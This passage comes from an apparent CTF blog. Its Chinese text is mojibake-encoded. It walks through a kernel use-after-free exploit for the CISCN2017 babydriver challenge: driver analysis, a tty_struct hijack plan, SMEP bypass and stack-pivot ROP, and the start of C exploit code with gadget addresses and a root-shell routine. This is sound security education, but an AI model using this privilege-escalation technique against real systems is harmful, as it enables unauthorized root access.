punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>DESCRIPTOR<span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">)</span><span class="token punctuation">,</span>    _descriptor<span class="token punctuation">.</span>FieldDescriptor<span class="token punctuation">(</span>      name<span class="token operator">=</span><span class="token string">'idx'</span><span class="token punctuation">,</span> full_name<span class="token operator">=</span><span class="token string">'tutorial.msg.idx'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>      number<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> cpp_type<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>      has_default_value<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>      message_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> enum_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> containing_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      is_extension<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> extension_scope<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>DESCRIPTOR<span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">)</span><span class="token punctuation">,</span>    _descriptor<span class="token punctuation">.</span>FieldDescriptor<span class="token punctuation">(</span>      name<span class="token operator">=</span><span class="token string">'size'</span><span class="token punctuation">,</span> full_name<span class="token operator">=</span><span class="token string">'tutorial.msg.size'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>      number<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> cpp_type<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>      has_default_value<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>      message_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> enum_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> containing_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      is_extension<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> extension_scope<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>DESCRIPTOR<span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  extensions<span class="token operator">=</span><span class="token punctuation">[</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  nested_types<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  enum_types<span class="token operator">=</span><span class="token punctuation">[</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>  is_extendable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>  syntax<span class="token operator">=</span><span class="token string">'proto2'</span><span class="token punctuation">,</span>  extension_ranges<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  oneofs<span class="token operator">=</span><span class="token punctuation">[</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  serialized_start<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span>  serialized_end<span class="token operator">=</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token punctuation">)</span>DESCRIPTOR<span class="token punctuation">.</span>message_types_by_name<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> _MSG_sym_db<span class="token punctuation">.</span>RegisterFileDescriptor<span class="token punctuation">(</span>DESCRIPTOR<span class="token punctuation">)</span>msg <span class="token operator">=</span> _reflection<span class="token punctuation">.</span>GeneratedProtocolMessageType<span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>_message<span class="token punctuation">.</span>Message<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token string">'DESCRIPTOR'</span> <span class="token punctuation">:</span> _MSG<span class="token punctuation">,</span>  <span class="token string">'__module__'</span> <span class="token punctuation">:</span> <span class="token string">'x1nri_pb2'</span>  <span class="token comment"># @@protoc_insertion_point(class_scope:tutorial.msg)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>_sym_db<span class="token punctuation">.</span>RegisterMessage<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token comment"># @@protoc_insertion_point(module_scope)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/eb74957d1f02605e6c0211d828d8d75a_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Heap - Use After Free</title>
      <link href="/2023/12/01/Kernel%20Heap%20-%20Use%20After%20Free/"/>
      <url>/2023/12/01/Kernel%20Heap%20-%20Use%20After%20Free/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x04-Kernel-Heap-Use-After-Free">ã€PWN.0x00ã€‘Linux Kernel Pwn Iï¼šBasic Exploit to Kernel Pwn in CTF - arttnba3â€™s blog</a></p></blockquote><h1 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h1><p>UAF å³ Use After Freeï¼Œé€šå¸¸æŒ‡çš„æ˜¯<strong>å¯¹äºé‡Šæ”¾åæœªé‡ç½®çš„å‚æ‚¬æŒ‡é’ˆçš„åˆ©ç”¨</strong>ï¼Œæ­¤å‰åœ¨ç”¨æˆ·æ€ä¸‹çš„ heap é˜¶æ®µå¯¹äº ptmalloc çš„åˆ©ç”¨å¾ˆå¤šéƒ½æ˜¯åŸºäºUAFæ¼æ´è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚</p><p>åœ¨ CTF å½“ä¸­ï¼Œå†…æ ¸çš„â€œå †å†…å­˜â€ä¸»è¦æŒ‡çš„æ˜¯<code>çº¿æ€§æ˜ å°„åŒºï¼ˆdirect mapping areaï¼‰</code>ï¼Œå¸¸ç”¨çš„åˆ†é…å‡½æ•° <code>kmalloc</code> ä»æ­¤å¤„åˆ†é…å†…å­˜ï¼Œå¸¸ç”¨çš„åˆ†é…å™¨ä¸º <code>slub</code>ï¼Œè‹¥æ˜¯åœ¨ kernel ä¸­å­˜åœ¨ç€å‚æ‚¬æŒ‡é’ˆï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä»¥æ­¤å®Œæˆå¯¹ slab&#x2F;slub å†…å­˜åˆ†é…å™¨çš„åˆ©ç”¨ï¼Œé€šè¿‡ Kernel UAF å®Œæˆææƒã€‚</p><h1 id="äºŒã€Kernel-Heap-é¦–æ€ï¼šCISCN2017-babydriver"><a href="#äºŒã€Kernel-Heap-é¦–æ€ï¼šCISCN2017-babydriver" class="headerlink" title="äºŒã€Kernel Heap é¦–æ€ï¼šCISCN2017 - babydriver"></a>äºŒã€Kernel Heap é¦–æ€ï¼šCISCN2017 - babydriver</h1><h2 id="ä¸€-ç¨‹åºåˆ†æ"><a href="#ä¸€-ç¨‹åºåˆ†æ" class="headerlink" title="(ä¸€)ç¨‹åºåˆ†æ"></a>(ä¸€)ç¨‹åºåˆ†æ</h2><h3 id="boot-sh"><a href="#boot-sh" class="headerlink" title="boot.sh"></a>boot.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>qemu-system-x86_64 <span class="token parameter variable">-initrd</span> core.cpio <span class="token parameter variable">-kernel</span> bzImage <span class="token parameter variable">-append</span> <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> -enable-kvm <span class="token parameter variable">-monitor</span> /dev/null <span class="token parameter variable">-m</span> 128M <span class="token parameter variable">--nographic</span>  <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-cpu</span> kvm64,+smep <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ï¼ˆå¥½ä¹±ï¼‰<br>å¼€äº†smep</p><h3 id="core-init"><a href="#core-init" class="headerlink" title="core&#x2F;init"></a>core&#x2F;init</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs devtmpfs /dev<span class="token function">chown</span> root:root flag<span class="token function">chmod</span> <span class="token number">400</span> flag<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/consoleinsmod /lib/modules/4.4.72/babydriver.ko<span class="token function">chmod</span> <span class="token number">777</span> /dev/babydev<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token function">umount</span> /proc<span class="token function">umount</span> /syspoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span>  <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>LKMsçš„ä½ç½®åœ¨ &#x2F;lib&#x2F;modules&#x2F;4.4.72&#x2F;babydriver.ko</p><h2 id="babydriver-ko"><a href="#babydriver-ko" class="headerlink" title="babydriver.ko"></a>babydriver.ko</h2><p><img src="/Binary_FILE/15c6f1e01eb1f04c1408e276bd16b4eb_MD5.jpeg"></p><p>åªå¼€äº†NX</p><h3 id="babydriver-init"><a href="#babydriver-init" class="headerlink" title="babydriver_init()"></a>babydriver_init()</h3><p>åœ¨é©±åŠ¨è¢«åŠ è½½æ—¶ä¼šåˆå§‹åŒ–ä¸€ä¸ªè®¾å¤‡èŠ‚ç‚¹æ–‡ä»¶<code>/dev/babydev</code></p><p><img src="/Binary_FILE/e740437a883b83234d96a87bfdca07dd_MD5.jpeg"></p><h3 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen()"></a>babyopen()</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">babyopen</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>  babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> <span class="token number">64LL</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æˆ‘ä»¬ä½¿ç”¨open()æ‰“å¼€è®¾å¤‡æ–‡ä»¶æ—¶è¯¥é©±åŠ¨ä¼šåˆ†é…ä¸€ä¸ª64byteçš„chunk</p><blockquote><p>kmem_cache_alloc_traceå‡½æ•°æ˜¯Linuxå†…æ ¸ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºä»ç‰¹å®šçš„ç¼“å­˜è·å–å¯¹è±¡<br>cachepï¼šç”¨äºè·å–å¯¹è±¡çš„ç¼“å­˜ã€‚<br>flagsï¼šç²¾ç¡®æè¿°åˆ†é…ç‰¹å¾çš„æ ‡å¿—å˜é‡<br>sizeï¼šè·å–çš„å¤§å°</p></blockquote><p>å¹¶å°†è¿”å›çš„å †æŒ‡é’ˆå’Œsizeæ”¾å…¥ä»¥ä¸‹çš„å…¨å±€å˜é‡<code>babydev_struct</code>ä¸­ï¼š</p><p><img src="/Binary_FILE/e740437a883b83234d96a87bfdca07dd_MD5.jpeg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">babydevice_t</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>device_buf<span class="token punctuation">;</span><span class="token class-name">size_t</span> device_buf_len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl()"></a>babyioctl()</h3><p><img src="/Binary_FILE/7e46fdaf779faf5fc8fcb85de40d09d3_MD5.jpeg"><br>ä½¿ç”¨ ioctl è¿›è¡Œé€šä¿¡åˆ™å¯ä»¥é‡æ–°ç”³è¯·å†…å­˜ï¼Œé‡Šæ”¾æ‰åŸchunkï¼Œå¹¶é‡æ–°ç”³è¯·è‡ªå®šä¹‰å¤§å°çš„chunk</p><h3 id="babyread"><a href="#babyread" class="headerlink" title="babyread()"></a>babyread()</h3><p><img src="/Binary_FILE/70eafb02991b24feb3758e4e02b721ec_MD5.jpeg"><br>åæ±‡ç¼–æœ‰ç‚¹é—®é¢˜ï¼Œçœ‹ä¸‹æ±‡ç¼–ï¼Œæ˜¯åœ¨è°ƒç”¨copy_from_userä¹‹å‰ä¼šæ£€æŸ¥device_buf_lenæ˜¯å¦å¤§äºç”¨æˆ·è¦æ±‚çš„é•¿åº¦ï¼Œå¦åˆ™ä¸ä¼šæ‰§è¡Œ<br><img src="/Binary_FILE/eb9c16005ae447ae1039ffc305017cb0_MD5.jpeg"><br>ä»kernel-&gt;userå†™æ•°æ®</p><h3 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite()"></a>babywrite()</h3><p><img src="/Binary_FILE/5f01a206027d442a4b74073cbfdcbbde_MD5.jpeg"><br>åŒç†ï¼Œä»user-&gt;kernelå†™æ•°æ®</p><h3 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease()"></a>babyrelease()</h3><p><img src="/Binary_FILE/ed4470c68c2f0d183268a0285384ee78_MD5.jpeg"></p><p>å†å…³é—­è®¾å¤‡æ–‡ä»¶æ—¶é‡Šæ”¾æ‰äº†chunkï¼Œä½†æ˜¯æ²¡æœ‰ç½®ç©ºæŒ‡é’ˆï¼Œå­˜åœ¨UAFæ¼æ´</p><h2 id="äºŒ-EXP"><a href="#äºŒ-EXP" class="headerlink" title="(äºŒ)EXP"></a>(äºŒ)EXP</h2><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>ropperçœ‹ä¸€ä¸‹gadgetï¼š</p><ul><li>æœ‰swapgså’Œiretq</li><li>æœ‰<code>mov cr4, ...</code>çš„gadgetï¼Œå¯ä»¥å…³é—­SMEPä¿æŠ¤<br><img src="/Binary_FILE/e2f64b05fb9f29bf8dfa5995fe749d39_MD5.jpeg"></li><li>å†…æ ¸å‡½æ•°è¡¨å¯è¯»</li></ul><p>æ”»å‡»æ€è·¯ï¼š</p><ol><li>æ‰“å¼€ä¸¤ä¸ª&#x2F;dev&#x2F;babydriverï¼ˆåˆ†åˆ«ä¸ºfd1ã€fd2ï¼‰ï¼Œå¯¹fd1è¿›è¡Œioctlå°†sizeæ”¹ä¸ºsizef(struct tty_struct)ï¼Œå¹¶é‡Šæ”¾è¯¥chunkã€‚ç”±äºUAFæˆ‘ä»¬çš„fd2èƒ½å¤Ÿç»§ç»­è®¿é—®è¯¥freechunk</li><li>æ‰“å¼€ &#x2F;dev&#x2F;ptmxï¼Œä¼šåˆ†é…ä¸€ä¸ªtty_structç»“æ„ä½“ï¼ˆæ­£å¥½æ˜¯é‡Šæ”¾æ‰çš„é‚£ä¸ªchunkï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡fd2è®¿é—®è¯¥chunkï¼Œå³çº‚æ”¹<code>tty_struct-&gt;*ops</code>ã€‚åˆå› ä¸ºæ²¡å¼€å¯SMAPæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨ç”¨æˆ·æ€æ„é€ <code>fake tty_operations</code>å†™ropchainè¿›è¡Œææƒã€‚</li><li>å½“ç„¶ç”±äºå†…æ ¸ä¸­æ²¡æœ‰one_gadgetä¹‹ç±»çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œæ ˆè¿ç§»ï¼Œå°†æ ˆè¿ç§»åˆ°æˆ‘ä»¬çš„fake tty_operations</li></ol><p>ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ï¼Œè§‚å¯Ÿå†…æ ¸åœ¨è°ƒç”¨æˆ‘ä»¬çš„æ¶æ„å‡½æ•°æŒ‡é’ˆæ—¶å„å¯„å­˜å™¨çš„å€¼ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œé€‰æ‹©åŠ«æŒtty_operaiontsç»“æ„ä½“åˆ°ç”¨æˆ·æ€çš„æ ˆä¸Šï¼Œå¹¶é€‰æ‹©ä»»æ„ä¸€æ¡å†…æ ¸gadgetä½œä¸ºfake ttyå‡½æ•°ï¼ˆæˆ‘é€‰æ‹©çš„æ˜¯babywriteï¼‰æŒ‡é’ˆä»¥æ–¹ä¾¿ä¸‹æ–­ç‚¹ã€‚</p><p>åœ¨æˆ‘ä»¬è°ƒç”¨<code>tty_operations-&gt;write</code>æ—¶ï¼Œ<strong>å…¶raxå¯„å­˜å™¨ä¸­å­˜æ”¾çš„ä¾¿æ˜¯tty_operationsç»“æ„ä½“çš„åœ°å€</strong>ï¼š<br><img src="/Binary_FILE/dd37b28b274e3f7a2fb63fd82c64b1f1_MD5.jpeg"></p><p>å› æ­¤è‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿåœ¨å†…æ ¸ä¸­æ‰¾åˆ°å½¢å¦‚<code>mov rsp, rax</code>çš„gadgetï¼Œä¾¿èƒ½å¤ŸæˆåŠŸåœ°å°†æ ˆè¿ç§»åˆ°<code>tty_operations</code>ç»“æ„ä½“çš„å¼€å¤´ï¼š</p><blockquote><p>è¿™é‡ŒåŒæ—¶ä½¿ç”¨äº†ropperå’ŒROPgadgetï¼Œä¸¤è€…æ‰¾åˆ°çš„gadgetæœ‰å·®å¼‚<br><img src="/Binary_FILE/4435e3a3df63acd20410447f48fb8f22_MD5.jpeg"></p></blockquote><p><img src="/Binary_FILE/ddfa82852870c81106e9705cdf04d1ef_MD5.jpeg"><br>å¯è§<code>jmp 0xffffffff8181bf7e;</code>å³<code>ret;</code>ï¼Œæˆ‘ä»¬ä¾¿é€‰æ‹©<code>0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</code>ä½œä¸ºæˆ‘ä»¬æ ˆåŠ«æŒçš„gadget</p><ol start="4"><li>ç°åœ¨æˆ‘ä»¬å°†æ ˆåŠ«æŒåˆ°äº†fake_opsé¡¶ç«¯ï¼Œä¸è¿‡ç”±äºfake_opsç¦»writeè·ç¦»å¤ªå°ä¸å¤Ÿå¡å…¥ropchainï¼Œæˆ‘ä»¬éœ€è¦å†ä¸€æ¬¡è¿›è¡Œæ ˆåŠ«æŒ</li></ol><p><img src="/Binary_FILE/05e66dd3273fbb72ee433dffaeb7ea51_MD5.jpeg"></p><ol start="5"><li>å°†æ ˆåŠ«æŒåˆ°ropä¸Šï¼Œå®Œæˆåˆ©ç”¨</li></ol><p>è¡¥å……ï¼š<br>ä¸€å¼€å§‹å‡ºç°å‡ºç°è¿™æ ·çš„æŠ¥é”™<br><img src="/Binary_FILE/b7b2c535dcbcd5a0a0e19d992057bf93_MD5.jpeg"><br>æŸ¥äº†ä¸€äº›èµ„æ–™è¿‡åï¼Œå‘ç°å¾ˆå¯èƒ½æ˜¯<code>PTI</code>ä¿æŠ¤æœºåˆ¶çš„é—®é¢˜ï¼Œåœ¨å°è¯•å…³é—­<code>PTI</code>æ— æœä¹‹åï¼Œå‘ç°å…¶å®å¯ä»¥é€šè¿‡å¯¹ç‰¹å®š<code>signal</code>çš„å¤„ç†æ¥ç»§ç»­å®Œæˆåˆ©ç”¨ï¼Œæ¯”å¦‚è¯´<code>PTI</code>æœºåˆ¶è¿™é‡Œä¼šæŠ›å‡ºçš„11å·ä¿¡å·ï¼Œç»™ä»–å¤„ç†æˆ<code>getRootshell</code>è¿™ä¸ªå‡½æ•°å°±è¡Œäº†ï¼Œå› ä¸ºåœ¨è¿™ä¹‹å‰å·²ç»å®Œæˆäº†bypass smepå’Œ<code>prepare_kernel_cred(commit_creds(0))</code>çš„æ“ä½œã€‚</p><p>ï¼ˆæœ¬æ¥æƒ³ç”¨<code>swapgs_restore_regs_and_return_to_usermode</code>çš„ï¼Œä¸è¿‡è¿™ä¸ªé¢˜å†…æ ¸ç‰ˆæœ¬4.4.72å¤ªè€äº†ï¼Œè²Œä¼¼è¿˜å¹¶æ²¡æœ‰å¼•è¿›è¿™ä¸ªå‡½æ•°ï¼‰</p><h3 id="è‡ªå†™exp"><a href="#è‡ªå†™exp" class="headerlink" title="è‡ªå†™exp"></a>è‡ªå†™exp</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff81063694</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_RET</span> <span class="token expression"><span class="token number">0xffffffff814e35ef</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_CR4_RDI_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff81004d80</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff810d238d</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RSP_RET</span> <span class="token expression"><span class="token number">0xffffffff81171045</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RSP_RAX_DEC_EBX_RET</span> <span class="token expression"><span class="token number">0xffffffff8181bfc5</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RAX_RSP</span> <span class="token expression"><span class="token number">0xffffffff8100ce6e</span><span class="token punctuation">;</span> </span></span><span class="token class-name">size_t</span> commit_creds_addr <span class="token operator">=</span> <span class="token number">0xffffffff810a1420</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred_addr <span class="token operator">=</span> <span class="token number">0xffffffff810a1810</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_sp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>__asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token string">"mov user_cs,cs;"</span><span class="token string">"mov user_ss,ss;"</span><span class="token string">"mov user_sp,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop user_rflags;"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootRrivilege</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">void</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token 